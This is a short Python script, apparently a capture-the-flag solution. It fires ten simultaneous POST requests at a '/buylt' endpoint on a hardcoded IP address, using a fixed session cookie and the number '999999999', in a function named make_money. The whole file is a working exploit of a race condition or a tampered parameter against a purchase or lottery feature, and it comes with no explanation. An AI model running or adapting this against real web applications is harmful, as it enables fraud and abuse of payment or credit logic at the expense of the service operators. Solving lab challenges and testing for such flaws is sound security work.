#coding=UTF-8
import requests
import threading

url = "http://117.78.26.200:32583/buylt"

def make_money():
	header = {"Cookie": "go_iris_cookie=69dcf953-ba3c-4214-bf0c-bffa1cc2f103; hibext_instdsigdipv2=1"}
	data = {"number":"999999999"}
	response = requests.post(url,headers=header,data=data)
	print(response.text)

try:
	for i in range(10):
		t1 = threading.Thread(target=make_money, args=[])
		t1.start()
	
except:
   print("Error: unable to start thread")